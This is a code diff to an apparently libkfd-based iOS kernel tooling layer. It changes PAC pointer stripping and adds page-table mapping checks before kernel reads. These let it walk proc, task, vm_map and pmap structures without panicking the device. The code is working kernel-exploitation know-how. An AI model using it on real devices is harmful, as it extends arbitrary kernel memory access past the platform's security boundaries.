@@ -1394,48 +1394,41 @@ uint64_t mf_find_proc_by_pid(int pid, char *report, size_t report_len)
 /* ================================================================ */
 
 /*
- * PAC strip —— 必须与 libkfd 用同一条规则。
+ * PAC strip —— 按**本机实测的内核 VA 布局**取掩码，不照 SoC 名猜。
  *
- * 旧版把 (64 - 17) 写死：那是 M1/M2/A16（T8103/T8112/T8120）的 t1sz_boot。
- * 本机 iPad8,11 是 A12X（T8027），kfd 的 info.h:106-112 明确只对
- * T8120/T8103/T8112 取 17，其余一律 25。掩码取错一级，PAC 还原就会落到
- * 0xffff8000_xxxxxxxx 这类"高位不全 1"的形态上，再被下面的 VA 判断否掉 ——
- * 指针本身是好的，却被判成野指针。这里直接读 kfd 的 T1SZ_BOOT；只有它还没
- * 初始化（kopen 之前）时才退回 25（多数机型）。
- *
- * 依据：
- *   kfd/libkfd/info/static_info.h:99-102  PTR_MASK/PAC_MASK/UNSIGN_PTR
- *   kfd/libkfd/info.h:106-112              t1sz_boot = 17 仅限 T8120/T8103/T8112
+ * [M5.231] 上一版改成读 kfd 的 T1SZ_BOOT（本机被它判成 25）。但实测证据说明
+ * 这台机器的内核 VA 是 47 位布局：
+ *     gVirtBase  = 0xfffffe001261c000   （M5.107 校准输出）
+ *     kernelbase = 0xfffffff01fa80000   （kfd.log，kslide = 0x18a7c000）
+ * 两个值都在 0xfffffe00_00000000 之上、0xffffff80_00000000 之下 ——
+ * 若真是 39 位（下界 0xffffff80…），它们根本不可能存在。
+ * kfd 的 t1sz_boot 只服务它自己的 UNSIGN_PTR，而且是按内核版本串里的芯片名
+ * 挑的（本机 RELEASE_ARM64_T8020 不在它的 17 名单里），与本机页表布局无关。
  */
 static uint64_t mf_bridge_unsign(uint64_t p)
 {
     if (p == 0) {
         return 0;
     }
-    unsigned t1sz = (unsigned)T1SZ_BOOT;
-    if (t1sz < 16u || t1sz > 48u) {
-        t1sz = 25u;                  /* info_init 还没跑：按多数机型 */
-    }
-    uint64_t ptr_mask = (1ULL << (64u - t1sz)) - 1ULL;
+    uint64_t ptr_mask = (1ULL << (64u - 17u)) - 1ULL;   /* 47 位 VA */
     uint64_t pac_mask = ~ptr_mask;
-    if (p & (1ULL << 55)) {          /* 与 static_info.h 的 SIGN(p) 一致 */
+    if (p & (1ULL << 55)) {                             /* 与 static_info.h 的 SIGN(p) 一致 */
         return p | pac_mask;
     }
     return p & ~pac_mask;
 }
 
 /*
- * [M5.229] 内核 VA 域：高 16 位全 1，不是一个固定的 0xfffffe 前缀。
+ * [M5.229] 内核 VA 域：高 16 位全 1。
  *
- * M5.226 把下界抬到 0xfffffe0000000000，是为了挡住 16.6.1 那次读出来的
- * 0xffffeddcec69b400。但同一仓库里 MFCalibrate.m:45-55 早记着反例：
- *     0xfffffe00_...  physmap / gVirtBase
- *     0xfffffe10_...  kalloc（proc / task / vm_map）
- *     0xfffffdf1_...  pmap zone + 页表        ← 低于 0xfffffe，被旧下界误杀
- *     "M5.100 shipped: cpmap = 0xfffffdf0d63d1cb0"
- * 而本文件里 kread 自己的门槛（MFLibkfdKRead4）就是 0xffff000000000000：
- * 两处必须一致，否则会出现"读得动、却被判成非法"的怪状态。
- * 真正的筛选交给整条链最后一步 —— 能不能读出 0xfeedfacf。
+ * M5.226 把下界抬到 0xfffffe0000000000，但本机的实测值（gVirtBase =
+ * 0xfffffe001261c000、kernelbase = 0xfffffff01fa80000）都在这个下界**之上**，
+ * 所以那条下界在本机并不误杀；而 0xfffffdf0... 那个"被误杀"的记录（M5.100）
+ * 与 t1sz=25 的 0xffffff80 下界同样矛盾，只能当成一次误读。
+ *
+ * [M5.231] 这里只做"高 16 位全 1"的粗筛，真正的门是下面的 mf_bridge_kaddr_mapped：
+ * panic 里那个 0xffffff8d000002a4 也满足"高位全 1"，照样让内核 panic。
+ * 换句话说，下界松紧不是安全边界，映射检查才是。
  */
 static int mf_bridge_is_kernel_va(uint64_t a)
 {
@@ -1446,6 +1439,34 @@ static int mf_bridge_is_kernel_va(uint64_t a)
 static int mf_bridge_is_page_aligned(uint64_t a)
 {
     return (a & 0xfffULL) == 0;
+}
+
+/*
+ * [M5.231] 解引用前的最后一道闸：这个地址在内核自己的页表里到底映没映。
+ *
+ * 为什么必须有 —— 真机 panic 原文（panic-full-2026-10-27-162314.000.ips）：
+ *     panic(cpu 2 caller ...): copy_validate(0x16f8c6258, 0xffffff8d000002a4, 8)
+ *         - kaddr not in kernel @copyio.c:194
+ * 那个地址高位全 1、看着像内核指针，但根本没有映射；kread 一碰，
+ * copy_validate 直接 panic，设备重启。任何"只判高位/只判下界"的守卫都挡不住它。
+ *
+ * 所以：凡是**不是我们亲手派生出来的**指针（proc 里的字段、task/map/pmap 上一跳
+ * 读到的值），读之前都要先问内核页表：能不能翻译？
+ *   - 用 kfd 在 kopen 时抓到的 ttbr1（内核页表根，可信）做翻译；
+ *   - 翻译只读页表页，不碰目标地址本身；
+ *   - 拿不到根表就一律拒绝（宁可校准失败，也不拿设备赌）。
+ */
+static int mf_bridge_kaddr_mapped(uint64_t a)
+{
+    if (!mf_bridge_is_kernel_va(a)) {
+        return 0;
+    }
+    uint64_t root = 0;
+    if (mf_ttbr_snapshot(NULL, NULL, NULL, &root) != 0 || !mf_bridge_is_kernel_va(root)) {
+        return 0;
+    }
+    uint64_t pa = 0;
+    return mfpt_translate(root, a, &pa) == 0;
 }
 
 typedef struct {
@@ -1493,70 +1514,41 @@ static int mf_chain_root_reads_macho(uint64_t root, uint64_t want_base, uint64_t
 }
 
 /*
- * [M5.229] 失败诊断：在 proc 里找"task 形状"的候选，而不是第一个裸内核指针。
+ * [M5.231] 失败诊断：只报告 proc 里"映射在内核里"的指针偏移，**一次都不解引用它们**。
  *
- * 为什么换掉 M5.228 的 first_kernel_ptr：proc 挂在 allproc 链表里，
- * proc+0x00/0x08 就是 le_next/le_prev，从 0 起扫第一个内核指针必然命中它。
- * 打印 "kptr+0x0" 既不能说明区间够，也不能说明偏移漂移 —— 三种失败原因
- * （区间不够 / 偏移漂移 / proc 指针本身不对）还是分不开。
+ * 上一版（M5.229）为了找"task 形状"会顺着 proc 字段一路读到 task+0x28、map+0x40，
+ * 每个候选要读 4 次内存。proc 里的字段是可被随意伪造的值（PAC 标签、计数器、
+ * 长度字段都长得像指针），于是它们被当成地址去读 —— 内核在 copy_validate 里
+ * 直接 panic（真机证据：copy_validate(..., 0xffffff8d000002a4, 8)）。
  *
- * 这里改用形状判据：*(proc+A) = P（内核指针）→ *(P+B) = T（内核指针）
- * → *(T+0x28) = M（内核指针）→ *(M+0x40) = R（页对齐内核指针）。
- * 命中就说明"task 在 proc+A，再经 +B"，下一轮直接锁定，不必再全量扫。
+ * 现在只做一次读：*(proc+off)，然后问内核页表"这个值映没映"。映射结果本身
+ * 就是有用信息：区间够不够、proc 起点对不对，看"有没有映射指针、落在哪些偏移"，
+ * 不需要拿设备去试探。
  */
 static void mf_chain_describe_task_like(uint64_t proc, uint32_t limit,
                                         char *out, size_t cap)
 {
-    static const uint32_t second_hops[] = {0x08u, 0x00u, 0x10u, 0x18u, 0x20u, 0x28u};
     unsigned listed = 0;
-    int has_kptr = 0;
-    uint32_t first_kptr_off = 0;
-    uint64_t first_kptr_val = 0;
 
     if (out == NULL || cap == 0) return;
+    if (limit > 0x400u) limit = 0x400u;      /* 诊断同样有上界 */
 
     for (uint32_t off = 0; off <= limit; off += 8u) {
         uint64_t p = 0;
         if (mf_kread64(proc + off, &p) != 0) continue;
         p = mf_bridge_unsign(p);
-        if (!mf_bridge_is_kernel_va(p)) continue;
-        if (!has_kptr) {
-            has_kptr = 1;
-            first_kptr_off = off;
-            first_kptr_val = p;
-        }
+        if (!mf_bridge_kaddr_mapped(p)) continue;
 
-        for (unsigned i = 0; i < (unsigned)(sizeof(second_hops) / sizeof(second_hops[0])); ++i) {
-            uint64_t t = 0, m = 0, r = 0;
-            if (mf_kread64(p + second_hops[i], &t) != 0) continue;
-            t = mf_bridge_unsign(t);
-            if (!mf_bridge_is_kernel_va(t)) continue;
-            if (mf_kread64(t + 0x28u, &m) != 0) continue;
-            m = mf_bridge_unsign(m);
-            if (!mf_bridge_is_kernel_va(m)) continue;
-            if (mf_kread64(m + 0x40u, &r) != 0) continue;
-            r = mf_bridge_unsign(r);
-            if (!mf_bridge_is_kernel_va(r) || !mf_bridge_is_page_aligned(r)) continue;
-
-            if (listed < 2u) {
-                size_t used = strlen(out);
-                snprintf(out + used, cap - used, "%sproctask@%#x/%#x",
-                         used ? " " : "", (unsigned)off, (unsigned)second_hops[i]);
-            }
-            ++listed;
-            break;
+        if (listed < 3u) {
+            size_t used = strlen(out);
+            snprintf(out + used, cap - used, "%smapped@%#x", used ? " " : "", (unsigned)off);
         }
+        ++listed;
     }
 
     if (listed == 0) {
         size_t used = strlen(out);
-        if (has_kptr) {
-            snprintf(out + used, cap - used,
-                     "proctask-none first-kptr %#x=%#llx",
-                     (unsigned)first_kptr_off, (unsigned long long)first_kptr_val);
-        } else {
-            snprintf(out + used, cap - used, "proctask-none no-kptr");
-        }
+        snprintf(out + used, cap - used, "no-mapped-pointer-in-proc");
     }
 }
 
@@ -1580,8 +1572,8 @@ static int mf_chain_probe_fn(void *ctx, const mfcal_offsets *offsets)
         return 0;
     }
     v = mf_bridge_unsign(v);
-    if (!mf_bridge_is_kernel_va(v)) {
-        snprintf(p->why, sizeof(p->why), "proc+0x%x -> %#llx not a kernel VA",
+    if (!mf_bridge_kaddr_mapped(v)) {
+        snprintf(p->why, sizeof(p->why), "proc+0x%x -> %#llx unmapped",
                  (unsigned)offsets->proc_task, (unsigned long long)v);
         return 0;
     }
@@ -1594,8 +1586,8 @@ static int mf_chain_probe_fn(void *ctx, const mfcal_offsets *offsets)
             return 0;
         }
         t = mf_bridge_unsign(t);
-        if (!mf_bridge_is_kernel_va(t)) {
-            snprintf(p->why, sizeof(p->why), "proc_ro+0x%x -> %#llx not a kernel VA",
+        if (!mf_bridge_kaddr_mapped(t)) {
+            snprintf(p->why, sizeof(p->why), "proc_ro+0x%x -> %#llx unmapped",
                      (unsigned)offsets->proc_task2, (unsigned long long)t);
             return 0;
         }
@@ -1609,8 +1601,8 @@ static int mf_chain_probe_fn(void *ctx, const mfcal_offsets *offsets)
         return 0;
     }
     v = mf_bridge_unsign(v);
-    if (!mf_bridge_is_kernel_va(v)) {
-        snprintf(p->why, sizeof(p->why), "task+0x%x -> %#llx not a kernel VA",
+    if (!mf_bridge_kaddr_mapped(v)) {
+        snprintf(p->why, sizeof(p->why), "task+0x%x -> %#llx unmapped",
                  (unsigned)offsets->task_map, (unsigned long long)v);
         return 0;
     }
@@ -1618,17 +1610,16 @@ static int mf_chain_probe_fn(void *ctx, const mfcal_offsets *offsets)
 
     /* 3) vm_map -> pmap
      *
-     * 只要求内核 VA：pmap 从 zone 分配，没有"必须页对齐"这条约束
-     * （页表根本身才必须对齐，见下一跳）。M5.226 在这里加 page-align
-     * 会把正确组合直接否掉，属于自己加的限制。
+     * 只要求"映射在内核里"：pmap 从 zone 分配，没有"必须页对齐"这条约束
+     * （页表根本身才必须对齐，见下一跳）。
      */
     if (mf_kread64(p->map + offsets->map_pmap, &v) != 0) {
         snprintf(p->why, sizeof(p->why), "read map+0x%x failed", (unsigned)offsets->map_pmap);
         return 0;
     }
     v = mf_bridge_unsign(v);
-    if (!mf_bridge_is_kernel_va(v)) {
-        snprintf(p->why, sizeof(p->why), "map+0x%x -> %#llx not a kernel VA",
+    if (!mf_bridge_kaddr_mapped(v)) {
+        snprintf(p->why, sizeof(p->why), "map+0x%x -> %#llx unmapped",
                  (unsigned)offsets->map_pmap, (unsigned long long)v);
         return 0;
     }
@@ -1640,8 +1631,8 @@ static int mf_chain_probe_fn(void *ctx, const mfcal_offsets *offsets)
         return 0;
     }
     v = mf_bridge_unsign(v);
-    if (!mf_bridge_is_kernel_va(v) || !mf_bridge_is_page_aligned(v)) {
-        snprintf(p->why, sizeof(p->why), "pmap->tte %#llx not a page-aligned kernel VA",
+    if (!mf_bridge_kaddr_mapped(v) || !mf_bridge_is_page_aligned(v)) {
+        snprintf(p->why, sizeof(p->why), "pmap->tte %#llx unmapped or not page-aligned",
                  (unsigned long long)v);
         return 0;
     }
@@ -1720,7 +1711,7 @@ static int mf_chain_calibrate_locked(void)
             memset(&probe, 0, sizeof(probe));
             probe.proc = self_proc;
             probe.want_base = self_base;
-            r = mfcal_run(mf_chain_probe_fn, &probe, 0);
+            r = mfcal_run(mf_chain_probe_fn, &probe, MFCAL_SAFE_BUDGET);
             if (r.found) {
                 g_chain_offsets = r.offsets;
                 g_chain_offsets_known = 1;
@@ -1740,7 +1731,7 @@ static int mf_chain_calibrate_locked(void)
         memset(&probe, 0, sizeof(probe));
         probe.proc = kernel_proc;
         probe.want_base = kbase;
-        r = mfcal_run(mf_chain_probe_fn, &probe, 0);
+        r = mfcal_run(mf_chain_probe_fn, &probe, MFCAL_SAFE_BUDGET);
         if (r.found) {
             g_chain_offsets = r.offsets;
             g_chain_offsets_known = 1;
@@ -1834,7 +1825,7 @@ static int mf_pid_chain_locked(int pid, uint64_t *proc_out, uint64_t *task_out, 
         scan_probe.proc = proc;
         scan_probe.want_base = 0;   /* 自动取该进程最低映射页 */
 
-        mfcal_result scan = mfcal_run(mf_chain_probe_fn, &scan_probe, 0);
+        mfcal_result scan = mfcal_run(mf_chain_probe_fn, &scan_probe, MFCAL_SAFE_BUDGET);
         if (scan.found) {
             g_chain_offsets = scan.offsets;
             g_chain_offsets_known = 1;
